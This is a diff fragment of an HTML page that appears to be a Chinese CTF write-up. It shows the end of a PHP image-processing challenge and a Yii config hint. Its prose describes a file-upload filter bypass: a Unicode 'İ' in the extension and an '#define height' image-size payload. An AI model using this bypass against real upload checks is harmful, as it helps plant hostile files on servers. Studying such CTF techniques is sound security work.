+</span></span><span class="line"><span class="cl">            <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$second</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$first</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>两个结合起来不难发现需要上传zip（php的Unicode绕过找不到），但是后缀中不能包含i，参考<a href="https://bugs.php.net/bug.php?id=70072" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=70072</a>发现可以使用<code>İ</code>绕过，图片尺寸通过以下payload绕过（位置可以不在头部）</p>
 <pre tabindex="0"><code>#define height 1
@@ -817,13 +817,13 @@ drwxr-xr-x 1 root root 4096 Sep 22 2016 ..
 <blockquote>
 <p>hint:</p>
 <pre tabindex="0"><code>据说这是配置文件里面的重要内容，或许对你有用！！
-  'log' =&gt; [
-      'traceLevel' =&gt; YII_DEBUG ? 0 : 0,
-      'targets' =&gt; [
+  &#39;log&#39; =&gt; [
+      &#39;traceLevel&#39; =&gt; YII_DEBUG ? 0 : 0,
+      &#39;targets&#39; =&gt; [
           [
-              'class' =&gt; 'yii\log\FileTarget',
-              'levels' =&gt; ['error'],
-              'logVars' =&gt; [],
+              &#39;class&#39; =&gt; &#39;yii\log\FileTarget&#39;,
+              &#39;levels&#39; =&gt; [&#39;error&#39;],
+              &#39;logVars&#39; =&gt; [],
           ],
       ],
   ],
